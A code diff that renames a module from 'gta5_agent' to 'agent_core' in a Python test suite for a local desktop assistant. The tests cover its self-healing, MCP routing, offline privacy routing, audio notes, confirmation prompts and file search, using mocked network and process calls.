                 rewrites.append(error)
                 return f"print({len(rewrites)!r})\n"
 
-            gta5_agent.heal_runner_override = always_fail
-            gta5_agent.heal_rewriter_override = keep_rewriting
-            stopped = gta5_agent.self_heal.self_heal_execution(str(job))
+            agent_core.heal_runner_override = always_fail
+            agent_core.heal_rewriter_override = keep_rewriting
+            stopped = agent_core.self_heal.self_heal_execution(str(job))
             self.assertFalse(stopped["ok"])
             self.assertIn("Stopped after 3 attempts", stopped["error"])
             self.assertEqual(len(calls), 3)
             self.assertEqual(len(rewrites), 2)
 
-            gta5_agent.heal_rewriter_override = _guard_rewriter
+            agent_core.heal_rewriter_override = _guard_rewriter
             with self.assertRaises(AssertionError) as live:
-                gta5_agent.self_heal.self_heal_execution(str(job))
+                agent_core.self_heal.self_heal_execution(str(job))
             self.assertIn("real gemini", str(live.exception))
 
             private = workspace / "private_job.py"
@@ -3784,10 +3784,10 @@ class AgentToolTests(unittest.TestCase):
                     "stderr": f"NameError: missing {secret}",
                 }
 
-            gta5_agent.network_up_override = False
-            gta5_agent.heal_rewriter_override = None
-            gta5_agent.heal_runner_override = private_runner
-            gta5_agent.ollama_transport_override = ollama_rewrite
+            agent_core.network_up_override = False
+            agent_core.heal_rewriter_override = None
+            agent_core.heal_runner_override = private_runner
+            agent_core.ollama_transport_override = ollama_rewrite
             original_import = builtins.__import__
 
             def guarded_import(name: str, *args: object, **kwargs: object) -> object:
@@ -3797,7 +3797,7 @@ class AgentToolTests(unittest.TestCase):
 
             with mock.patch("local_llm.socket.create_connection", side_effect=AssertionError("real socket")):
                 with mock.patch("builtins.__import__", guarded_import):
-                    healed = gta5_agent.self_heal.self_heal_execution(str(private))
+                    healed = agent_core.self_heal.self_heal_execution(str(private))
             self.assertTrue(healed["ok"], healed)
             self.assertIn("Fixed and finished on attempt 2", healed["message"])
             self.assertEqual(len(sent), 1)
@@ -3811,10 +3811,10 @@ class AgentToolTests(unittest.TestCase):
         cube = "import bpy\nbpy.ops.mesh.primitive_cube_add()\n"
         broken_script = "import bpy\nbpy.ops.mesh.primitive_basket_add()\n"
         notes: list[str] = []
-        gta5_agent.blender_notify_override = notes.append
-        gta5_agent.blender_executable_override = self.root / "blender.exe"
-        gta5_agent.self_heal_enabled = False
-        gta5_agent.network_up_override = True
+        agent_core.blender_notify_override = notes.append
+        agent_core.blender_executable_override = self.root / "blender.exe"
+        agent_core.self_heal_enabled = False
+        agent_core.network_up_override = True
         blender_calls: list[str] = []
 
         def fail_once(
@@ -3829,9 +3829,9 @@ class AgentToolTests(unittest.TestCase):
                 "stderr": "AttributeError: primitive_basket_add",
             }
 
-        gta5_agent.blender_runner_override = fail_once
-        gta5_agent.begin_task_turn("Make a basket in Blender")
-        once = gta5_agent.invoke_tool(
+        agent_core.blender_runner_override = fail_once
+        agent_core.begin_task_turn("Make a basket in Blender")
+        once = agent_core.invoke_tool(
             "run_blender_task",
             {"script": broken_script, "output_path": str(workspace / "once.obj")},
         )
@@ -3839,7 +3839,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(once["status"], "failed")
         self.assertEqual(len(blender_calls), 1)
 
-        gta5_agent.self_heal_enabled = True
+        agent_core.self_heal_enabled = True
 
         def heal_runner(
             command: list[str],
@@ -3863,9 +3863,9 @@ class AgentToolTests(unittest.TestCase):
             self.assertIn("AttributeError", error)
             return cube
 
-        gta5_agent.blender_runner_override = heal_runner
-        gta5_agent.heal_rewriter_override = heal_rewriter
-        ready = gta5_agent.invoke_tool(
+        agent_core.blender_runner_override = heal_runner
+        agent_core.heal_rewriter_override = heal_rewriter
+        ready = agent_core.invoke_tool(
             "run_blender_task",
             {"script": broken_script, "output_path": str(workspace / "healed.obj")},
         )
@@ -3874,28 +3874,28 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("Fixed and finished on attempt 2", ready["message"])
         self.assertTrue((workspace / "healed.obj").is_file())
 
-        gta5_agent.heal_rewriter_override = None
-        gta5_agent.network_up_override = False
+        agent_core.heal_rewriter_override = None
+        agent_core.network_up_override = False
         local_payloads: list[dict[str, object]] = []
 
         def local_fix(payload: dict[str, object]) -> dict[str, object]:
             local_payloads.append(payload)
             return {"message": {"content": cube}}
 
-        gta5_agent.ollama_transport_override = local_fix
-        offline = gta5_agent.invoke_tool(
+        agent_core.ollama_transport_override = local_fix
+        offline = agent_core.invoke_tool(
             "run_blender_task",
             {"script": broken_script, "output_path": str(workspace / "offline.obj")},
         )
         self.assertTrue(offline["ok"], offline)
         self.assertEqual(offline["status"], "ready")
         self.assertGreaterEqual(len(local_payloads), 1)
-        gta5_agent.blender_task.last_notice = None
+        agent_core.blender_task.last_notice = None
 
     def test_mcp_router_uses_config_and_a_fake_transport(self) -> None:
-        self.assertIn("mcp_router", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("mcp_servers.json", gta5_agent.SYSTEM_PROMPT)
-        missing = gta5_agent.invoke_tool("mcp_router", {"action": "list_servers"})
+        self.assertIn("mcp_router", agent_core.SYSTEM_PROMPT)
+        self.assertIn("mcp_servers.json", agent_core.SYSTEM_PROMPT)
+        missing = agent_core.invoke_tool("mcp_router", {"action": "list_servers"})
         self.assertTrue(missing["ok"], missing)
         self.assertEqual(missing["servers"], [])
         self.assertIn("mcp_servers.json", missing["message"])
@@ -3903,8 +3903,8 @@ class AgentToolTests(unittest.TestCase):
         config = self.root / "workspace" / "mcp_servers.json"
         config.parent.mkdir(parents=True, exist_ok=True)
         config.write_text("{", encoding="utf-8")
-        gta5_agent.mcp_config_override = config
-        unreadable = gta5_agent.mcp_router.mcp_router("list_servers")
+        agent_core.mcp_config_override = config
+        unreadable = agent_core.mcp_router.mcp_router("list_servers")
         self.assertFalse(unreadable["ok"])
         self.assertIn("could not be read", unreadable["error"])
 
@@ -3919,11 +3919,11 @@ class AgentToolTests(unittest.TestCase):
             ),
             encoding="utf-8",
         )
-        listed = gta5_agent.invoke_tool("mcp_router", {"action": "list_servers"})
+        listed = agent_core.invoke_tool("mcp_router", {"action": "list_servers"})
         self.assertTrue(listed["ok"], listed)
         self.assertEqual(listed["servers"], ["notes"])
 
-        unknown = gta5_agent.mcp_router.mcp_router(
+        unknown = agent_core.mcp_router.mcp_router(
             "call",
             server="github",
             tool="query",
@@ -3932,7 +3932,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertFalse(unknown["ok"])
         self.assertIn("Unknown MCP server", unknown["error"])
 
-        shell = gta5_agent.mcp_router.mcp_router(
+        shell = agent_core.mcp_router.mcp_router(
             "call",
             server="notes",
             tool="query",
@@ -3940,7 +3940,7 @@ class AgentToolTests(unittest.TestCase):
         )
         self.assertFalse(shell["ok"])
         self.assertIn("JSON object", shell["error"])
-        empty_tool = gta5_agent.mcp_router.mcp_router(
+        empty_tool = agent_core.mcp_router.mcp_router(
             "call",
             server="notes",
             tool="",
@@ -3960,10 +3960,10 @@ class AgentToolTests(unittest.TestCase):
                 return {"content": [{"type": "text", "text": "1"}]}
             raise AssertionError(method)
 
-        gta5_agent.mcp_transport_override = transport
+        agent_core.mcp_transport_override = transport
         with mock.patch("subprocess.Popen", side_effect=AssertionError("real process")):
-            tools = gta5_agent.invoke_tool("mcp_router", {"action": "list_tools", "server": "notes"})
-            called = gta5_agent.mcp_router.mcp_router(
+            tools = agent_core.invoke_tool("mcp_router", {"action": "list_tools", "server": "notes"})
+            called = agent_core.mcp_router.mcp_router(
                 "call",
                 server="notes",
                 tool="query",
@@ -3976,31 +3976,25 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(seen[0][1], "tools/list")
         self.assertEqual(seen[1][1], "tools/call")
 
-        gta5_agent.mcp_transport_override = _guard_mcp
+        agent_core.mcp_transport_override = _guard_mcp
         with self.assertRaises(AssertionError) as live:
-            gta5_agent.mcp_router.mcp_router("list_tools", server="notes")
+            agent_core.mcp_router.mcp_router("list_tools", server="notes")
         self.assertIn("real mcp", str(live.exception))
 
     def test_rea_mcp_is_registered_without_spawning(self) -> None:
         import agent_config
         import mcp_router
 
-        example = (gta5_agent.APP_DIR / "mcp_servers.example.json").read_text(encoding="utf-8")
+        example = (agent_core.APP_DIR / "mcp_servers.example.json").read_text(encoding="utf-8")
         self.assertIn("rea-agents", example)
         self.assertIn('"rea"', example)
         self.assertNotIn("C:\\Users\\", example)
-        skill = (
-            gta5_agent.APP_DIR / "skills" / "reverse-engineer-anything" / "SKILL.md"
-        ).read_text(encoding="utf-8")
-        self.assertIn("analyze_javascript_application", skill)
-        self.assertIn("inspect_managed_artifact", skill)
-        self.assertIn("open_binary", skill)
-        self.assertIn('server "rea"', gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("analyze_javascript_application", gta5_agent.SYSTEM_PROMPT)
-        self.assertNotIn("elevenlabs", gta5_agent.SYSTEM_PROMPT.casefold())
-        self.assertFalse(gta5_agent._request_needs_plan("reverse engineer this app"))
+        self.assertIn('server "rea"', agent_core.SYSTEM_PROMPT)
+        self.assertIn("analyze_javascript_application", agent_core.SYSTEM_PROMPT)
+        self.assertNotIn("elevenlabs", agent_core.SYSTEM_PROMPT.casefold())
+        self.assertFalse(agent_core._request_needs_plan("reverse engineer this app"))
         self.assertTrue(
-            gta5_agent._request_needs_plan(
+            agent_core._request_needs_plan(
                 "reverse engineer this app and update my spreadsheet"
             )
         )
@@ -4017,11 +4011,11 @@ class AgentToolTests(unittest.TestCase):
             ),
             encoding="utf-8",
         )
-        gta5_agent.mcp_config_override = config
+        agent_core.mcp_config_override = config
         with mock.patch("subprocess.run", side_effect=AssertionError("real rea")):
             with mock.patch("subprocess.Popen", side_effect=AssertionError("real process")):
                 servers = mcp_router.ensure_rea_server(config)
-                listed = gta5_agent.invoke_tool("mcp_router", {"action": "list_servers"})
+                listed = agent_core.invoke_tool("mcp_router", {"action": "list_servers"})
         self.assertIn("rea", servers)
         self.assertIn("notes", servers)
         self.assertTrue(listed["ok"], listed)
@@ -4054,14 +4048,14 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("real rea", str(guard.exception))
 
     def test_private_or_offline_turn_stays_on_ollama(self) -> None:
-        self.assertIn("Ollama", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("llama3.2", gta5_agent.SYSTEM_PROMPT)
-        self.assertFalse(gta5_agent.local_llm.use_local_first("is the export done?"))
-        self.assertFalse(gta5_agent.local_llm.use_local_first("my password is hunter2"))
-        self.assertTrue(gta5_agent.local_llm.use_local_first("keep this private"))
-        self.assertTrue(gta5_agent.local_llm.use_local_first("please work offline today"))
+        self.assertIn("Ollama", agent_core.SYSTEM_PROMPT)
+        self.assertIn("llama3.2", agent_core.SYSTEM_PROMPT)
+        self.assertFalse(agent_core.local_llm.use_local_first("is the export done?"))
+        self.assertFalse(agent_core.local_llm.use_local_first("my password is hunter2"))
+        self.assertTrue(agent_core.local_llm.use_local_first("keep this private"))
+        self.assertTrue(agent_core.local_llm.use_local_first("please work offline today"))
         self.assertFalse(
-            gta5_agent._request_needs_plan("keep this private and update my spreadsheet")
+            agent_core._request_needs_plan("keep this private and update my spreadsheet")
         )
         previous_key = os.environ.get("GEMINI_API_KEY")
         secret = "AIzaSyTESTKEY1234567890abcd"
@@ -4089,10 +4083,10 @@ class AgentToolTests(unittest.TestCase):
             return original_import(name, *args, **kwargs)
 
         try:
-            gta5_agent.ollama_transport_override = transport
+            agent_core.ollama_transport_override = transport
             with mock.patch("local_llm.socket.create_connection", side_effect=AssertionError("real socket")):
                 with mock.patch("builtins.__import__", guarded_import):
-                    private = gta5_agent.run_agent(
+                    private = agent_core.run_agent(
                         f"keep this private {secret}",
                         [],
                         "gemini-3.5-flash-lite",
@@ -4106,23 +4100,23 @@ class AgentToolTests(unittest.TestCase):
             self.assertIn("tool", roles)
 
             sent.clear()
-            gta5_agent.ollama_transport_override = None
-            gta5_agent.ollama_reachable_override = False
-            gta5_agent.network_up_override = False
+            agent_core.ollama_transport_override = None
+            agent_core.ollama_reachable_override = False
+            agent_core.network_up_override = False
             with mock.patch("local_llm.socket.create_connection", side_effect=AssertionError("real socket")):
                 with mock.patch("builtins.__import__", guarded_import):
-                    offline = gta5_agent.run_agent("hello", [], "gemini-3.5-flash-lite")
+                    offline = agent_core.run_agent("hello", [], "gemini-3.5-flash-lite")
             self.assertIn("Ollama is not running", offline)
             self.assertIn("not sent online", offline)
 
             os.environ["PRIVACY_MODE"] = "1"
-            gta5_agent.network_up_override = True
-            gta5_agent.ollama_transport_override = (
+            agent_core.network_up_override = True
+            agent_core.ollama_transport_override = (
                 lambda payload: {"message": {"content": "Private mode."}}
             )
             try:
                 with mock.patch("builtins.__import__", guarded_import):
-                    flagged = gta5_agent.run_agent("hello there", [], "gemini-3.5-flash-lite")
+                    flagged = agent_core.run_agent("hello there", [], "gemini-3.5-flash-lite")
             finally:
                 os.environ.pop("PRIVACY_MODE", None)
             self.assertEqual(flagged, "Private mode.")
@@ -4146,10 +4140,10 @@ class AgentToolTests(unittest.TestCase):
                     self.models = FakeModels()
 
             sent.clear()
-            gta5_agent.network_up_override = True
-            gta5_agent.ollama_transport_override = transport
-            gta5_agent.genai_client_override = lambda api_key: FakeClient(api_key)
-            online = gta5_agent.run_agent(
+            agent_core.network_up_override = True
+            agent_core.ollama_transport_override = transport
+            agent_core.genai_client_override = lambda api_key: FakeClient(api_key)
+            online = agent_core.run_agent(
                 "is the export done?",
                 [],
                 "gemini-3.5-flash-lite",
@@ -4167,17 +4161,17 @@ class AgentToolTests(unittest.TestCase):
                     self.models = DropModels()
 
             sent.clear()
-            gta5_agent.genai_client_override = lambda api_key: DropClient(api_key)
+            agent_core.genai_client_override = lambda api_key: DropClient(api_key)
 
             def answer(payload: dict[str, object]) -> dict[str, object]:
                 sent.append(payload)
                 return {"message": {"content": "Answered on this PC."}}
 
-            gta5_agent.ollama_transport_override = answer
+            agent_core.ollama_transport_override = answer
             slept: list[float] = []
             with mock.patch("local_llm.socket.create_connection", side_effect=AssertionError("real socket")):
-                with mock.patch("gta5_agent.time.sleep", side_effect=lambda seconds: slept.append(seconds)):
-                    dropped = gta5_agent.run_agent(
+                with mock.patch("agent_core.time.sleep", side_effect=lambda seconds: slept.append(seconds)):
+                    dropped = agent_core.run_agent(
                         "is the export done?",
                         [],
                         "gemini-3.5-flash-lite",
@@ -4193,10 +4187,10 @@ class AgentToolTests(unittest.TestCase):
                 os.environ["GEMINI_API_KEY"] = previous_key
 
     def test_audio_scribe_saves_notes_without_opening_the_microphone(self) -> None:
-        self.assertIn("audio_scribe_tool", gta5_agent.SYSTEM_PROMPT)
-        self.assertFalse(gta5_agent._request_needs_plan("record a voice note"))
+        self.assertIn("audio_scribe_tool", agent_core.SYSTEM_PROMPT)
+        self.assertFalse(agent_core._request_needs_plan("record a voice note"))
         with self.assertRaises(AssertionError) as guarded:
-            gta5_agent.audio_scribe.audio_scribe_tool(seconds=5)
+            agent_core.audio_scribe.audio_scribe_tool(seconds=5)
         self.assertIn("real microphone", str(guarded.exception))
 
         seen: list[tuple[str, int]] = []
@@ -4209,10 +4203,10 @@ class AgentToolTests(unittest.TestCase):
             self.assertGreaterEqual(path.stat().st_size, 16)
             return "Today we covered hooks. Then we saved the file."
 
-        gta5_agent.recorder_override = recorder
-        gta5_agent.transcriber_override = transcriber
+        agent_core.recorder_override = recorder
+        agent_core.transcriber_override = transcriber
         note = self.root / "workspace" / "lecture.md"
-        saved = gta5_agent.invoke_tool(
+        saved = agent_core.invoke_tool(
             "audio_scribe_tool",
             {"source": "system", "output_path": str(note)},
         )
@@ -4227,9 +4221,9 @@ class AgentToolTests(unittest.TestCase):
         def empty_transcriber(path: Path) -> str:
             return "   "
 
-        gta5_agent.transcriber_override = empty_transcriber
+        agent_core.transcriber_override = empty_transcriber
         empty_note = self.root / "workspace" / "empty.md"
-        empty = gta5_agent.audio_scribe.audio_scribe_tool(
+        empty = agent_core.audio_scribe.audio_scribe_tool(
             seconds=5,
             output_path=str(empty_note),
         )
@@ -4238,10 +4232,10 @@ class AgentToolTests(unittest.TestCase):
         self.assertFalse(empty_note.exists())
 
         recorded = len(seen)
-        refused = gta5_agent.audio_scribe.audio_scribe_tool(seconds=900)
+        refused = agent_core.audio_scribe.audio_scribe_tool(seconds=900)
         self.assertFalse(refused["ok"])
         self.assertIn("600", refused["error"])
-        zero = gta5_agent.audio_scribe.audio_scribe_tool(seconds=0)
+        zero = agent_core.audio_scribe.audio_scribe_tool(seconds=0)
         self.assertFalse(zero["ok"])
         self.assertEqual(len(seen), recorded)
 
@@ -4251,11 +4245,11 @@ class AgentToolTests(unittest.TestCase):
             used.append(source)
             raise AssertionError("real microphone")
 
-        gta5_agent.recorder_override = file_recorder
-        gta5_agent.transcriber_override = transcriber
+        agent_core.recorder_override = file_recorder
+        agent_core.transcriber_override = transcriber
         audio = self.root / "workspace" / "clip.wav"
         audio.write_bytes(b"0123456789abcdef")
-        filed = gta5_agent.audio_scribe.audio_scribe_tool(
+        filed = agent_core.audio_scribe.audio_scribe_tool(
             source="file",
             audio_path=str(audio),
             output_path=str(self.root / "workspace" / "from-file.md"),
@@ -4265,9 +4259,9 @@ class AgentToolTests(unittest.TestCase):
 
         drive = self.root / "pedrodrive"
         drive.mkdir()
-        gta5_agent._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
-        gta5_agent.recorder_override = recorder
-        pedro = gta5_agent.audio_scribe.audio_scribe_tool(
+        agent_core._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
+        agent_core.recorder_override = recorder
+        pedro = agent_core.audio_scribe.audio_scribe_tool(
             source="mic",
             seconds=12,
             output_path="GameDrive/notes/lecture.md",
@@ -4276,16 +4270,16 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue((drive / "notes" / "lecture.md").is_file())
         self.assertEqual(seen[-1], ("mic", 12))
 
-        gta5_agent.recorder_override = recorder
-        gta5_agent.transcriber_override = _guard_transcriber
+        agent_core.recorder_override = recorder
+        agent_core.transcriber_override = _guard_transcriber
         with self.assertRaises(AssertionError) as whisper_guard:
-            gta5_agent.audio_scribe.audio_scribe_tool(
+            agent_core.audio_scribe.audio_scribe_tool(
                 seconds=5,
                 output_path=str(self.root / "workspace" / "guard.md"),
             )
         self.assertIn("real whisper", str(whisper_guard.exception))
 
-        gta5_agent.transcriber_override = None
+        agent_core.transcriber_override = None
         original_import = builtins.__import__
 
         def block_whisper(name: str, *args: object, **kwargs: object) -> object:
@@ -4295,7 +4289,7 @@ class AgentToolTests(unittest.TestCase):
             return original_import(name, *args, **kwargs)
 
         with mock.patch("builtins.__import__", block_whisper):
-            missing_model = gta5_agent.audio_scribe.audio_scribe_tool(
+            missing_model = agent_core.audio_scribe.audio_scribe_tool(
                 seconds=5,
                 output_path=str(self.root / "workspace" / "needs-whisper.md"),
             )
@@ -4326,15 +4320,15 @@ class AgentToolTests(unittest.TestCase):
             return pending.pop(0)
 
         with (
-            mock.patch.object(gta5_agent, "_watch_mode_keys", lambda pressed, stop: None),
-            mock.patch.object(gta5_agent, "run_agent", side_effect=fake_run),
-            mock.patch.object(gta5_agent, "speak_response", side_effect=fake_speak),
+            mock.patch.object(agent_core, "_watch_mode_keys", lambda pressed, stop: None),
+            mock.patch.object(agent_core, "run_agent", side_effect=fake_run),
+            mock.patch.object(agent_core, "speak_response", side_effect=fake_speak),
             mock.patch.object(
-                gta5_agent, "listen_to_microphone", side_effect=fake_listen
+                agent_core, "listen_to_microphone", side_effect=fake_listen
             ),
             mock.patch("builtins.input", side_effect=lines),
         ):
-            code = gta5_agent.main(argv)
+            code = agent_core.main(argv)
         return code, prompts, spoken
 
 
@@ -4345,7 +4339,7 @@ class AgentToolTests(unittest.TestCase):
         import idle_tasks
 
         with self.assertRaises(AssertionError) as idle_guard:
-            gta5_agent.idle_seconds_override = 9999
+            agent_core.idle_seconds_override = 9999
             idle_tasks.run_idle_pass()
         self.assertIn("real idle", str(idle_guard.exception))
         seen: list[str] = []
@@ -4353,11 +4347,11 @@ class AgentToolTests(unittest.TestCase):
         def runner(task: str) -> None:
             seen.append(task)
             if task == "reindex_files":
-                gta5_agent.idle_seconds_override = 0
+                agent_core.idle_seconds_override = 0
 
-        gta5_agent.idle_task_seconds_override = 10
-        gta5_agent.idle_seconds_override = 11
-        gta5_agent.idle_runner_override = runner
+        agent_core.idle_task_seconds_override = 10
+        agent_core.idle_seconds_override = 11
+        agent_core.idle_runner_override = runner
         paused = idle_tasks.run_idle_pass()
         self.assertEqual(paused["status"], "paused")
         self.assertEqual(seen, ["reindex_files"])
@@ -4382,7 +4376,7 @@ class AgentToolTests(unittest.TestCase):
             release.wait(2)
             return {"ok": True, "message": task}
 
-        gta5_agent.delegate_runner_override = slow
+        agent_core.delegate_runner_override = slow
         first = delegate_agent.delegate_subagent("blender", "status of the mesh")
         second = delegate_agent.delegate_subagent("files", "find notes")
         third = delegate_agent.delegate_subagent("system", "health")
@@ -4396,7 +4390,7 @@ class AgentToolTests(unittest.TestCase):
         while time.time() < deadline and delegate_agent._inflight:
             time.sleep(0.02)
         self.assertEqual(delegate_agent._inflight, 0)
-        gta5_agent.delegate_runner_override = lambda worker, task: {
+        agent_core.delegate_runner_override = lambda worker, task: {
             "ok": True,
             "message": f"{worker} finished {task}",
         }
@@ -4412,55 +4406,55 @@ class AgentToolTests(unittest.TestCase):
             killed.append(dict(payload or {}))
             return []
 
-        gta5_agent.process_override = processes
-        gta5_agent.voice_mode_active = False
-        blocked = gta5_agent.invoke_tool("kill_process", {"process_name": "notepad"})
+        agent_core.process_override = processes
+        agent_core.voice_mode_active = False
+        blocked = agent_core.invoke_tool("kill_process", {"process_name": "notepad"})
         self.assertTrue(blocked.get("needs_confirmation"))
         self.assertEqual(killed, [])
-        gta5_agent.begin_task_turn("yes")
-        closed = gta5_agent.invoke_tool("kill_process", {"process_name": "notepad"})
+        agent_core.begin_task_turn("yes")
+        closed = agent_core.invoke_tool("kill_process", {"process_name": "notepad"})
         self.assertTrue(closed["ok"], closed)
         self.assertEqual(killed, [{"pid": 10, "name": "notepad.exe"}])
         spoken: list[str] = []
-        gta5_agent.voice_mode_active = True
-        gta5_agent.confirm_speaker_override = spoken.append
-        gta5_agent.confirm_listener_override = lambda: "no"
-        denied = gta5_agent.invoke_tool("kill_process", {"process_name": "notepad"})
+        agent_core.voice_mode_active = True
+        agent_core.confirm_speaker_override = spoken.append
+        agent_core.confirm_listener_override = lambda: "no"
+        denied = agent_core.invoke_tool("kill_process", {"process_name": "notepad"})
         self.assertFalse(denied["ok"])
         self.assertFalse(denied.get("approved"))
         self.assertIn("Are you sure you want to execute", spoken[0])
         self.assertEqual(len(killed), 1)
-        gta5_agent.confirm_listener_override = lambda: "yes"
-        allowed = gta5_agent.invoke_tool("kill_process", {"process_name": "notepad"})
+        agent_core.confirm_listener_override = lambda: "yes"
+        allowed = agent_core.invoke_tool("kill_process", {"process_name": "notepad"})
         self.assertTrue(allowed["ok"], allowed)
-        gta5_agent.confirm_speaker_override = _guard_confirm_speak
-        gta5_agent.voice_mode_active = True
+        agent_core.confirm_speaker_override = _guard_confirm_speak
+        agent_core.voice_mode_active = True
         with self.assertRaises(AssertionError) as confirm_guard:
             confirm_action.confirm_sensitive_action("kill notepad")
         self.assertIn("real confirm", str(confirm_guard.exception))
-        gta5_agent.voice_mode_active = False
+        agent_core.voice_mode_active = False
 
         with self.assertRaises(AssertionError) as clip_guard:
             clipboard_context.read_clipboard_context()
         self.assertIn("real clipboard", str(clip_guard.exception))
-        gta5_agent.clipboard_override = lambda: ""
+        agent_core.clipboard_override = lambda: ""
         with self.assertRaises(AssertionError) as image_guard:
             clipboard_context.read_clipboard_context()
         self.assertIn("real clipboard image", str(image_guard.exception))
-        gta5_agent.clipboard_image_override = lambda: None
+        agent_core.clipboard_image_override = lambda: None
         trace = "Traceback (most recent call last):\n  File \"a.py\", line 3\nNameError: missing\n"
-        gta5_agent.clipboard_override = lambda: trace
+        agent_core.clipboard_override = lambda: trace
         proposed = clipboard_context.clipboard_action_dispatcher()
         self.assertEqual(proposed["kind"], "traceback")
         self.assertFalse(proposed["executed"])
         self.assertIn("explain", proposed["proposal"].casefold())
-        gta5_agent.clipboard_override = lambda: "https://example.com/report"
+        agent_core.clipboard_override = lambda: "https://example.com/report"
         linked = clipboard_context.clipboard_action_dispatcher()
         self.assertEqual(linked["kind"], "url")
-        gta5_agent.clipboard_override = lambda: "name,amount\nhats,3\n"
+        agent_core.clipboard_override = lambda: "name,amount\nhats,3\n"
         sheet = clipboard_context.clipboard_action_dispatcher()
         self.assertEqual(sheet["kind"], "csv")
-        gta5_agent.clipboard_override = lambda: "def build():\n    return 1\n"
+        agent_core.clipboard_override = lambda: "def build():\n    return 1\n"
         code = clipboard_context.clipboard_action_dispatcher()
         self.assertEqual(code["kind"], "code")
         from PIL import Image
@@ -4468,15 +4462,15 @@ class AgentToolTests(unittest.TestCase):
         frame = io.BytesIO()
         Image.new("RGB", (4, 4), (9, 8, 7)).save(frame, format="JPEG")
         jpeg = frame.getvalue()
-        gta5_agent.clipboard_override = lambda: ""
-        gta5_agent.clipboard_image_override = lambda: jpeg
+        agent_core.clipboard_override = lambda: ""
+        agent_core.clipboard_image_override = lambda: jpeg
         pictured = clipboard_context.read_clipboard_context()
         self.assertTrue(pictured["ok"], pictured)
         self.assertEqual(pictured["kind"], "image")
         self.assertTrue(pictured["_screenshot_bytes"].startswith(b"\xff\xd8"))
-        self.assertIn("[giggles]", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("HUGE", gta5_agent.SYSTEM_PROMPT)
-        self.assertNotIn("elevenlabs", gta5_agent.SYSTEM_PROMPT.casefold())
+        self.assertIn("[giggles]", agent_core.SYSTEM_PROMPT)
+        self.assertIn("HUGE", agent_core.SYSTEM_PROMPT)
+        self.assertNotIn("elevenlabs", agent_core.SYSTEM_PROMPT.casefold())
 
     def test_desktop_network_webcam_and_diagnostics_stay_local(self) -> None:
         import desktop_automation
@@ -4492,7 +4486,7 @@ class AgentToolTests(unittest.TestCase):
             commands.append(list(command))
             return {"returncode": 0, "stdout": "ok", "stderr": ""}
 
-        gta5_agent.network_runner_override = runner
+        agent_core.network_runner_override = runner
         with mock.patch("network_manager.subprocess.run", side_effect=AssertionError("spawned")):
             status = network_manager.network_manager("status")
             listed = network_manager.network_manager("wifi_list")
@@ -4504,20 +4498,20 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(commands[2], ["speedtest", "--json"])
         self.assertFalse(bad["ok"])
         self.assertEqual(len(commands), 3)
-        gta5_agent.network_runner_override = None
+        agent_core.network_runner_override = None
         with mock.patch("network_manager.shutil.which", return_value=None):
             missing = network_manager.network_manager("speed")
         self.assertIn("not installed", missing["error"].casefold())
-        gta5_agent.network_runner_override = runner
-        gta5_agent.voice_mode_active = False
-        waiting = gta5_agent.invoke_tool(
+        agent_core.network_runner_override = runner
+        agent_core.voice_mode_active = False
+        waiting = agent_core.invoke_tool(
             "network_manager",
             {"action": "wifi_connect", "profile": "Office"},
         )
         self.assertTrue(waiting.get("needs_confirmation"))
         self.assertEqual(len(commands), 3)
-        gta5_agent.begin_task_turn("yes")
-        connected = gta5_agent.invoke_tool(
+        agent_core.begin_task_turn("yes")
+        connected = agent_core.invoke_tool(
             "network_manager",
             {"action": "wifi_connect", "profile": "Office"},
         )
@@ -4527,10 +4521,10 @@ class AgentToolTests(unittest.TestCase):
         pressed: list[str] = []
         focused: list[str] = []
         started: list[str] = []
-        gta5_agent.pointer_override = lambda kind, details: pressed.append(kind)
-        gta5_agent.window_override = lambda kind, payload: focused.append(str((payload or {}).get("title")))
-        gta5_agent._start_target = lambda target: started.append(str(target))
-        gta5_agent.start_menu_override = self.root / "empty-start"
+        agent_core.pointer_override = lambda kind, details: pressed.append(kind)
+        agent_core.window_override = lambda kind, payload: focused.append(str((payload or {}).get("title")))
+        agent_core._start_target = lambda target: started.append(str(target))
+        agent_core.start_menu_override = self.root / "empty-start"
         too_many = desktop_automation.desktop_ui_automation(
             steps=[{"action": "press", "key": "enter"} for _ in range(9)]
         )
@@ -4546,10 +4540,10 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("Notes", focused)
         self.assertTrue(started)
 
-        self.assertIs(gta5_agent.TOOLS["webcam_vision_tool"], gta5_agent.capture_webcam_image)
+        self.assertIs(agent_core.TOOLS["webcam_vision_tool"], agent_core.capture_webcam_image)
         description = next(
             item["description"]
-            for item in gta5_agent.TOOL_DECLARATIONS
+            for item in agent_core.TOOL_DECLARATIONS
             if item["name"] == "webcam_vision_tool"
         )
         self.assertIn("desk", description.casefold())
@@ -4567,7 +4561,7 @@ class AgentToolTests(unittest.TestCase):
                 "processes": [{"name": "notepad.exe", "pid": 10, "rss_mb": 200}],
             }
 
-        gta5_agent.diagnostics_override = sample
+        agent_core.diagnostics_override = sample
         with mock.patch("diagnostics.subprocess.run", side_effect=AssertionError("nvidia")):
             health = diagnostics.system_diagnostics()
         self.assertTrue(health["ok"], health)
@@ -4578,7 +4572,7 @@ class AgentToolTests(unittest.TestCase):
     def test_rag_scheduler_clipboard_actions_and_macros(self) -> None:
         import routine_macros
 
-        root = gta5_agent.search_root_override
+        root = agent_core.search_root_override
         assert root is not None
         (root / "materials.py").write_text(
             "configured blender materials for the glass shader\n",
@@ -4594,7 +4588,7 @@ class AgentToolTests(unittest.TestCase):
         )
         with zipfile.ZipFile(root / "project-notes.docx", "w") as archive:
             archive.writestr("word/document.xml", document)
-        found = gta5_agent.invoke_tool(
+        found = agent_core.invoke_tool(
             "file_content_rag_search",
             {"query": "Find the script where I configured Blender materials"},
         )
@@ -4605,19 +4599,19 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("materials.py", blob)
         self.assertIn("blender", blob.casefold())
         self.assertNotIn("test-key-abc", blob)
